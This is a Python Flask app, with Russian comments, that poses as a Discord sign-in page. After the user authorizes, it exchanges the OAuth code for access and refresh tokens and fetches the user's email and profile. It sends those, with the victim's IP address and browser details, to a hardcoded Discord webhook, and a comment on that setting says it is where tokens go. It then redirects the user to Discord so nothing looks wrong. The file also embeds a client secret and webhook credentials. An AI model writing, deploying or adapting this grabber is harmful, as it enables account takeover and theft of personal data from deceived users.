from flask import Flask, request, redirect, render_template_string
import requests
import urllib.parse
import json
import logging
from datetime import datetime

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ===== НАСТРОЙКИ (ЗАМЕНИТЕ НА СВОИ) =====
CLIENT_ID = "1527673986652176454"  # Ваш Client ID из Discord Developer Portal
CLIENT_SECRET = "BDSxVH-0mJDliOaFKcrIlL0vswgU7Sdt"  # Ваш Client Secret
REDIRECT_URI = "https://ВАШ_СЕРВИС.onrender.com/callback"  # Замените после деплоя
WEBHOOK_URL = "https://https://discord.com/api/webhooks/1527674667274473502/VOQWxCWhCW0nx1-LY2PGhhJbNLBJadXkUOu1X3e2Y7nY43_gkhJaEGCvRtHcCqXatC79/collect"  # Куда отправлять токены
# =========================================

# Простой HTML для главной страницы
HOME_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Discord Auth</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .btn { background: #5865F2; color: white; padding: 15px 30px; 
               border-radius: 5px; text-decoration: none; font-size: 20px; }
        .btn:hover { background: #4752C4; }
    </style>
</head>
<body>
    <h1>🔐 Discord Authentication</h1>
    <p>Нажмите кнопку для входа через Discord</p>
    <a href="/login" class="btn">Войти через Discord</a>
</body>
</html>
"""

# HTML для страницы успеха
SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Успешно!</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .success { color: green; font-size: 24px; }
    </style>
</head>
<body>
    <h1 class="success">✅ Авторизация успешна!</h1>
    <p>Вы успешно авторизовались через Discord.</p>
    <p>Можете закрыть эту страницу.</p>
    <script>
        setTimeout(() => { window.location.href = 'https://discord.com/app'; }, 3000);
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    """Главная страница"""
    return HOME_PAGE

@app.route('/login')
def login():
    """Перенаправляет пользователя на страницу авторизации Discord"""
    discord_auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds"
    )
    logger.info(f"Перенаправление на Discord: {discord_auth_url}")
    return redirect(discord_auth_url)

@app.route('/callback')
def callback():
    """Обрабатывает редирект от Discord после авторизации"""
    # Получаем код из запроса
    code = request.args.get('code')
    error = request.args.get('error')
    
    if error:
        logger.error(f"Ошибка авторизации: {error}")
        return f"Ошибка: {error}", 400
    
    if not code:
        return "Ошибка: код не получен.", 400
    
    logger.info(f"Получен код авторизации: {code[:20]}...")
    
    # Обмениваем код на токен доступа
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    try:
        # Отправляем запрос к Discord API
        resp = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
        token_data = resp.json()
        
        if resp.status_code == 200:
            # Извлекаем токены
            access_token = token_data.get("access_token")
            refresh_token = token_data.get("refresh_token")
            token_type = token_data.get("token_type")
            expires_in = token_data.get("expires_in")
            scope = token_data.get("scope")
            
            logger.info(f"[+] Токен успешно получен для пользователя")
            
            # Формируем информацию для отправки
            payload = {
                "access_token": access_token,
                "refresh_token": refresh_token,
                "token_type": token_type,
                "expires_in": expires_in,
                "scope": scope,
                "timestamp": datetime.now().isoformat(),
                "ip": request.remote_addr,
                "user_agent": request.headers.get('User-Agent')
            }
            
            # Получаем информацию о пользователе
            try:
                headers = {'Authorization': f'Bearer {access_token}'}
                user_resp = requests.get('https://discord.com/api/users/@me', headers=headers)
                if user_resp.status_code == 200:
                    user_data = user_resp.json()
                    payload['user'] = {
                        'id': user_data.get('id'),
                        'username': user_data.get('username'),
                        'discriminator': user_data.get('discriminator'),
                        'email': user_data.get('email'),
                        'verified': user_data.get('verified'),
                        'avatar': user_data.get('avatar')
                    }
                    logger.info(f"[+] Получена информация о пользователе: {user_data.get('username')}")
            except Exception as e:
                logger.error(f"[-] Ошибка получения данных пользователя: {e}")
            
            # Отправляем токен на вебхук
            try:
                webhook_resp = requests.post(WEBHOOK_URL, json=payload, timeout=10)
                if webhook_resp.status_code == 200:
                    logger.info("[+] Токен успешно отправлен на вебхук")
                else:
                    logger.warning(f"[-] Вебхук ответил с кодом: {webhook_resp.status_code}")
            except Exception as e:
                logger.error(f"[-] Ошибка отправки на вебхук: {e}")
            
            # Возвращаем страницу успеха
            return SUCCESS_PAGE
            
        else:
            logger.error(f"[-] Ошибка обмена кода: {token_data}")
            return f"Ошибка получения токена: {token_data}", 400
            
    except Exception as e:
        logger.error(f"[-] Критическая ошибка: {e}")
        return "Внутренняя ошибка сервера.", 500

@app.route('/health')
def health():
    """Endpoint для проверки работоспособности"""
    return {"status": "ok", "timestamp": datetime.now().isoformat()}, 200

@app.errorhandler(404)
def not_found(e):
    return "Страница не найдена", 404

@app.errorhandler(500)
def server_error(e):
    return "Внутренняя ошибка сервера", 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080, debug=False)